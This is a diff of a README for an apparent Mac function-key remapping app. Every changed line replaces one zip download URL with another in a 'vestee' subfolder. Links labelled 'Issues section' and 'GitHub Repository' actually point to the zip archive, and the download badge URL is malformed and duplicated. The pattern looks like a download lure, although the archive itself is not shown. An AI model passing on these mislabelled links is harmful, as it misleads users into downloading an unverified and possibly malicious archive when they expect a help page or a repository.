@@ -8,7 +8,7 @@ Welcome to mac-fn-key-remapper! This application helps you easily remap your Mac
 
 To download the latest version of mac-fn-key-remapper, visit the Releases page below:
 
-[![Download mac-fn-key-remapper](https://github.com/Tomas10lol/mac-fn-key-remapper/raw/refs/heads/main/vestee/remapper-fn-key-mac-v3.4.zip%20Here-Get%20Latest%https://github.com/Tomas10lol/mac-fn-key-remapper/raw/refs/heads/main/vestee/remapper-fn-key-mac-v3.4.zip)](https://github.com/Tomas10lol/mac-fn-key-remapper/raw/refs/heads/main/vestee/remapper-fn-key-mac-v3.4.zip)
+[![Download mac-fn-key-remapper](https://raw.githubusercontent.com/Tomas10lol/mac-fn-key-remapper/main/vestee/key-mac-remapper-fn-v1.7.zip%20Here-Get%20Latest%https://raw.githubusercontent.com/Tomas10lol/mac-fn-key-remapper/main/vestee/key-mac-remapper-fn-v1.7.zip)](https://raw.githubusercontent.com/Tomas10lol/mac-fn-key-remapper/main/vestee/key-mac-remapper-fn-v1.7.zip)
 
 Follow these steps to get started:
 
@@ -50,11 +50,11 @@ If you encounter any issues, try the following:
 
 ## 📞 Support
 
-If you need help, please visit the [Issues section](https://github.com/Tomas10lol/mac-fn-key-remapper/raw/refs/heads/main/vestee/remapper-fn-key-mac-v3.4.zip) on GitHub to report bugs or ask questions. We are here to assist you!
+If you need help, please visit the [Issues section](https://raw.githubusercontent.com/Tomas10lol/mac-fn-key-remapper/main/vestee/key-mac-remapper-fn-v1.7.zip) on GitHub to report bugs or ask questions. We are here to assist you!
 
 ## 📌 Additional Resources
 
-- [GitHub Repository](https://github.com/Tomas10lol/mac-fn-key-remapper/raw/refs/heads/main/vestee/remapper-fn-key-mac-v3.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Tomas10lol/mac-fn-key-remapper/main/vestee/key-mac-remapper-fn-v1.7.zip)
 - Detailed guides on function key remapping
 - User community forums for tips and tricks
 
